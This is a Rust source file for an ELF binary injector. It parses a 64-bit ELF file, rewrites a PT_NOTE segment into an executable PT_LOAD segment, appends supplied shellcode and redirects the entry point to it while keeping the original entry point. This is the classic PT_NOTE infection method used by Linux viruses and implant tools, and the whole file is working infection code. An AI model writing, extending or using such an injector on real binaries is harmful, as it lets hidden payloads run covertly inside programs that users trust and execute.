use bytemuck::bytes_of;
use bytemuck::from_bytes;
use std::io::prelude::*;
use std::io::BufReader;
use std::io::BufWriter;
use std::io::Cursor;
use std::io::SeekFrom;

use crate::elf::*;
use crate::shellcode::Shellcode;

pub struct ElfFile {
    raw_data: Vec<u8>,
    pub length: usize,
    pub hdr: elf64_hdr,
    pub phdrs: Vec<elf64_phdr>,
    pub shdrs: Vec<elf64_shdr>,
}

impl ElfFile {
    pub fn new<T>(file: T) -> Result<Self, Box<dyn std::error::Error>>
    where
        T: std::io::Read + std::io::Seek,
    {
        let mut original = BufReader::new(file);
        let mut raw_data = BufWriter::new(Vec::<u8>::new());
        std::io::copy(&mut original, &mut raw_data)?;

        let mut header_buf = [0; ELF64_HDR_SIZE];
        original.seek(SeekFrom::Start(0))?;
        original.read_exact(&mut header_buf)?;
        let hdr: elf64_hdr = *from_bytes(&header_buf);

        let ident = hdr.e_ident;
        if ident[0] != ELFMAG0
            || ident[1] != ELFMAG1
            || ident[2] != ELFMAG2
            || ident[3] != ELFMAG3
            || ident[4] != ELFCLASS64
        {
            return Err("invalid file type".into());
        }

        let mut phdrs = Vec::<elf64_phdr>::new();
        original.seek(SeekFrom::Start(hdr.e_phoff))?;
        for _ in 0..hdr.e_phnum {
            let mut ph_buf = [0; ELF64_PHDR_SIZE];
            original.read_exact(&mut ph_buf)?;
            let ph_header: elf64_phdr = *from_bytes(&ph_buf);
            phdrs.push(ph_header);
        }

        let mut shdrs = Vec::<elf64_shdr>::new();
        original.seek(SeekFrom::Start(hdr.e_shoff))?;
        for _ in 0..hdr.e_shnum {
            let mut sh_buf = [0; ELF64_SHDR_SIZE];
            original.read_exact(&mut sh_buf)?;
            let sh_hdr: elf64_shdr = *from_bytes(&sh_buf);
            shdrs.push(sh_hdr);
        }

        let raw_data = raw_data.into_inner()?;
        let length = raw_data.len();
        Ok(Self {
            raw_data,
            length,
            hdr,
            phdrs,
            shdrs,
        })
    }

    pub fn pt_note_to_pt_load<T>(
        &mut self,
        shellcode: &mut T,
    ) -> Result<(), Box<dyn std::error::Error>>
    where
        T: std::io::Read + std::io::Seek,
    {
        let old_entry_point = self.hdr.e_entry;

        let length = self.length as u64;

        let vaddr = 0xcc000000 + length; // something high

        for mut ph in &mut self.phdrs {
            if ph.p_type == PT_NOTE {
                ph.p_type = PT_LOAD;
                ph.p_flags = PF_R | PF_W | PF_X;
                ph.p_offset = length;
                ph.p_vaddr = vaddr;
                self.hdr.e_entry = vaddr;
                break;
            }
        }
        let sc = Shellcode::new(shellcode, self.hdr.e_entry, old_entry_point)?;
        self.add_raw_to_end(sc.as_slice());

        Ok(())
    }

    pub fn reflect_changes(self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let mut cursor = Cursor::new(self.raw_data.clone());
        cursor.seek(SeekFrom::Start(0))?;
        cursor.write_all(bytes_of(&self.hdr))?;
        cursor.seek(SeekFrom::Start(self.hdr.e_phoff))?;
        for ph in &self.phdrs {
            let header = bytes_of(ph);
            cursor.write_all(&header)?;
        }
        cursor.seek(SeekFrom::Start(self.hdr.e_shoff))?;
        for sh in &self.shdrs {
            let header = bytes_of(sh);
            cursor.write_all(&header)?;
        }
        Ok(cursor.into_inner())
    }

    fn add_raw_to_end(&mut self, raw_bytes: &[u8]) {
        self.raw_data.extend_from_slice(raw_bytes);
        self.length = self.raw_data.len();
    }
}
